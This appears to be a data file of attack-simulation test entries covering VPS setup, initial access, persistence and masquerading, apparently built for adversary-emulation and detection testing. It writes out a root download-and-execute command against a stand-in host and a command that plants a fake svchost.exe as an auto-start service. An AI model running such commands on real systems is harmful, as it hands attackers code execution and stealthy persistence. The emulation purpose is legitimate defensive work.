attacks.description: Creates a benign configuration file simulating VPS server settings
attacks.expected_behavior: Creates vps_config.cfg in %TEMP% with test server details

attacks.description: Creates scheduled task pointing to non-existent script (simulates VPS automation)
attacks.expected_behavior: Creates a scheduled task that would execute a VPS management script if present

attacks.description: Compresses configuration file for simulated VPS deployment
attacks.expected_behavior: Creates vps_setup.zip archive containing the configuration file

attacks.command: sudo apt update && sudo apt install -y openvpn
attacks.description: Install OpenVPN to simulate setting up a VPN connection, which could be part of a VPS setup.
attacks.expected_behavior: Installs OpenVPN package and its dependencies.

attacks.description: Create and secure an OpenVPN directory, simulating configuration of a VPS for VPN services.
attacks.expected_behavior: Creates the OpenVPN directory and sets its permissions to secure it.

attacks.command: sudo wget https://example.com/vps-script.sh && sudo bash vps-script.sh
attacks.description: Downloads and executes a script from a hypothetical malicious server, simulating the acquisition of a VPS for malicious purposes.
attacks.expected_behavior: Downloads a script and executes it with elevated privileges. **CAUTION**: This command is for demonstration purposes only and should not be executed with a real, potentially malicious script.

attacks.description: Download a benign file using certutil to simulate the initial exploitation of a public-facing application
attacks.expected_behavior: The command downloads a benign file to the temporary directory, simulating the initial access via exploitation of a public-facing application.

attacks.description: Use PowerShell to invoke the downloaded benign file, simulating further exploitation
attacks.expected_behavior: The command invokes the benign file using PowerShell, demonstrating how an exploited application could be used to execute further malicious actions.

attacks.description: Create a directory and copy the benign file into it, simulating persistence or further exploitation
attacks.expected_behavior: The command creates a new directory and copies the benign file into it, demonstrating how an attacker might achieve persistence or prepare for further exploitation. This command requires admin privileges and is considered high risk due to the potential for destructive behavior if not used in a controlled environment.

attacks.description: Exploit a vulnerable public-facing application using curl
attacks.expected_behavior: The command will attempt to exploit the vulnerable application and may return a successful response or an error message.

attacks.description: Execute a malicious payload using bash
attacks.expected_behavior: The command will create a file containing the malicious payload in the /tmp directory.

attacks.description: Download and execute a malicious script using curl and bash
attacks.expected_behavior: The command will download the malicious script and execute it using bash, potentially leading to further exploitation.

attacks.technique_name: Masquerading: Match Legitimate Name or Location
attacks.description: Basic masquerading: copies a benign test file to the TEMP directory and renames it to svchost.exe, a common system process name.
attacks.expected_behavior: A new file named svchost.exe appears in the TEMP folder, containing the same content as payload.txt. No admin rights are required.

attacks.technique_name: Masquerading: Match Legitimate Name or Location
attacks.description: Intermediate masquerading: copies a benign file to the user's Startup folder and names it explorer.exe, matching a legitimate executable name that runs at logon.
attacks.expected_behavior: A file named explorer.exe is created in the Startup directory; it will be executed on user logon. No admin rights are required.

attacks.technique_name: Masquerading: Match Legitimate Name or Location
attacks.command: cmd /c copy "%TEMP%\payload.txt" "%SystemRoot%\System32\drivers\etc\svchost.exe" && sc create svchost binPath= "\"%SystemRoot%\System32\drivers\etc\svchost.exe\"" start= auto
attacks.description: Advanced masquerading: copies a benign file to a system directory and registers it as a Windows service named svchost, matching both the legitimate service name and typical location.
attacks.expected_behavior: The file svchost.exe is placed in %SystemRoot%\System32\drivers\etc, then a new service called svchost is created and set to start automatically. Requires administrative privileges.

attacks.technique_name: Masquerading: Match Legitimate Name or Location
attacks.description: Basic example of copying a legitimate program (ls) to a new location (/tmp) with a name similar to a known program (MQsTTang), demonstrating masquerading.
attacks.expected_behavior: The command creates a copy of the ls program in /tmp with the name mqttang_ls, mimicking the name of a legitimate program.

attacks.technique_name: Masquerading: Match Legitimate Name or Location
attacks.description: Intermediate example showing the movement of a legitimate program (ls) to a new location (/tmp) with a name that could be confused with a system service, further demonstrating masquerading.
attacks.expected_behavior: The command moves the ls program to /tmp and renames it to mqttang_service, which could be mistaken for a legitimate system service.

attacks.technique_name: Masquerading: Match Legitimate Name or Location
attacks.description: Advanced example creating a symbolic link to a legitimate program (ls) in a new location (/tmp) with a name suggesting it's a daemon process, demonstrating a sophisticated level of masquerading.
attacks.expected_behavior: The command creates a symbolic link to the ls program in /tmp named mqttang_daemon, making it appear as if it's a daemon process.

attacks.description: Create a directory for malware, create a benign malware file, then use PowerShell to read and write the file, simulating malware handling
